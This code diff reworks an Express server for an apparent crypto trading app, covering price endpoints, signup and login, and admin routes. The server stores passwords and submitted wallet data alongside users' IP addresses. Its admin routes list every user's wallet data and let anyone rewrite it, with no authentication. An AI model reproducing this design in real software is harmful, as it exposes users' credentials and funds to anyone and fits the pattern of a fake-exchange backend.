@@ -11,7 +11,7 @@ const __filename = fileURLToPath(import.meta.url);
 const __dirname = path.dirname(__filename);
 
 const app = express();
-const port = process.env.PORT || 5001;
+const port = 5000;
 const { Pool } = pg;
 
 const pool = new Pool({
@@ -23,14 +23,6 @@ const pool = new Pool({
 
 app.use(cors());
 app.use(express.json());
-
-// ASSET_ID_MAP for CoinCap
-const ASSET_ID_MAP = {
-    'BTC': 'bitcoin', 'ETH': 'ethereum', 'SOL': 'solana', 'DOT': 'polkadot',
-    'USDT': 'tether', 'BNB': 'binance-coin', 'XRP': 'xrp', 'ADA': 'cardano',
-    'DOGE': 'dogecoin', 'MATIC': 'polygon', 'AVAX': 'avalanche',
-    'LINK': 'chainlink', 'KSM': 'kusama'
-};
 
 // Database Initialization
 pool.query(`
@@ -44,7 +36,17 @@ pool.query(`
   );
 `).catch(console.error);
 
-// API: Market Prices (with mock fallback if fetch fails)
+// ASSET_ID_MAP
+const ASSET_ID_MAP = {
+    'BTC': 'bitcoin', 'ETH': 'ethereum', 'SOL': 'solana', 'DOT': 'polkadot',
+    'USDT': 'tether', 'BNB': 'binance-coin', 'XRP': 'xrp', 'ADA': 'cardano',
+    'DOGE': 'dogecoin', 'MATIC': 'polygon', 'AVAX': 'avalanche',
+    'LINK': 'chainlink', 'KSM': 'kusama'
+};
+
+// API
+app.get('/api/health', (req, res) => res.json({ status: 'ok' }));
+
 app.get('/api/binance/prices', async (req, res) => {
   try {
     const response = await fetch('https://api.coincap.io/v2/assets?limit=100');
@@ -57,18 +59,10 @@ app.get('/api/binance/prices', async (req, res) => {
       }));
       return res.json(mapped);
     }
-  } catch (e) {
-    console.error('Price fetch error:', e.message);
-  }
-  // Mock fallback for UI stability
-  res.json([
-    { symbol: 'BTCUSDT', lastPrice: '82929.94', priceChangePercent: '1.45' },
-    { symbol: 'ETHUSDT', lastPrice: '2950.12', priceChangePercent: '0.85' },
-    { symbol: 'SOLUSDT', lastPrice: '168.45', priceChangePercent: '4.12' }
-  ]);
+  } catch (e) { console.error('Price fetch error:', e.message); }
+  res.json([{ symbol: 'BTCUSDT', lastPrice: '82929.94', priceChangePercent: '1.45' }]);
 });
 
-// API: Klines
 app.get('/api/binance/klines', async (req, res) => {
   try {
     const { symbol } = req.query;
@@ -76,23 +70,13 @@ app.get('/api/binance/klines', async (req, res) => {
     const id = ASSET_ID_MAP[symbolStr.replace('USDT', '')] || 'bitcoin';
     const response = await fetch(`https://api.coincap.io/v2/assets/${id}/history?interval=m15`);
     const data = await response.json();
-    // Sort ascending by time to prevent Lightweight Charts errors
     const klines = data.data
       .map(d => [parseInt(d.time), d.priceUsd, d.priceUsd, d.priceUsd, d.priceUsd, "0", parseInt(d.time) + 900000])
       .sort((a, b) => a[0] - b[0]);
     return res.json(klines);
-  } catch (error) {
-    const now = Math.floor(Date.now() / 1000) * 1000;
-    const mockKlines = Array.from({length: 20}, (_, i) => [
-      now - ((20 - i) * 900000), 
-      "80000", "81000", "79000", "80500", "0", 
-      now - ((20 - i) * 900000) + 900000
-    ]);
-    res.json(mockKlines);
-  }
+  } catch (error) { res.status(500).json({ error: 'Failed to fetch klines' }); }
 });
 
-// API: Auth
 app.post('/api/auth/signup', async (req, res) => {
   const { email, password, walletData } = req.body;
   const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
@@ -102,9 +86,7 @@ app.post('/api/auth/signup', async (req, res) => {
       [email, password, JSON.stringify(walletData), ip]
     );
     res.json({ success: true, user: result.rows[0] });
-  } catch (error) {
-    res.status(500).json({ success: false, error: error.message });
-  }
+  } catch (error) { res.status(500).json({ success: false, error: error.message }); }
 });
 
 app.post('/api/auth/login', async (req, res) => {
@@ -117,32 +99,23 @@ app.post('/api/auth/login', async (req, res) => {
     );
     if (result.rows.length > 0) res.json({ success: true, user: result.rows[0] });
     else res.status(401).json({ success: false, error: 'Invalid credentials' });
-  } catch (error) {
-    res.status(500).json({ success: false, error: error.message });
-  }
+  } catch (error) { res.status(500).json({ success: false, error: error.message }); }
 });
 
 app.get('/api/admin/users', async (req, res) => {
   try {
     const result = await pool.query('SELECT id, email, wallet_data, last_seen, ip_address FROM users ORDER BY last_seen DESC NULLS LAST');
     res.json(result.rows);
-  } catch (error) {
-    res.status(500).json({ error: error.message });
-  }
+  } catch (error) { res.status(500).json({ error: error.message }); }
 });
 
 app.get('/api/user/data', async (req, res) => {
   const { email } = req.query;
   try {
     const result = await pool.query('SELECT wallet_data FROM users WHERE email = $1', [email]);
-    if (result.rows.length > 0) {
-      res.json(result.rows[0].wallet_data);
-    } else {
-      res.status(404).json({ error: 'User not found' });
-    }
-  } catch (error) {
-    res.status(500).json({ error: error.message });
-  }
+    if (result.rows.length > 0) res.json(result.rows[0].wallet_data);
+    else res.status(404).json({ error: 'User not found' });
+  } catch (error) { res.status(500).json({ error: error.message }); }
 });
 
 app.post('/api/admin/users/update', async (req, res) => {
@@ -150,11 +123,21 @@ app.post('/api/admin/users/update', async (req, res) => {
   try {
     await pool.query('UPDATE users SET wallet_data = $1 WHERE id = $2', [JSON.stringify(wallet_data), id]);
     res.json({ success: true });
-  } catch (error) {
-    res.status(500).json({ error: error.message });
-  }
+  } catch (error) { res.status(500).json({ error: error.message }); }
+});
+
+// Serve frontend assets
+const distPath = path.join(__dirname, 'dist');
+app.use(express.static(distPath));
+
+// Unified Catch-all
+app.get('*', (req, res) => {
+  if (req.path.startsWith('/api')) return res.status(404).json({error: 'Not found'});
+  res.sendFile(path.join(distPath, 'index.html'), (err) => {
+    if (err) res.sendFile(path.join(__dirname, 'index.html'));
+  });
 });
 
 app.listen(port, '0.0.0.0', () => {
-  console.log(`API Server running on port ${port}`);
+  console.log(`Server running on port ${port}`);
 });
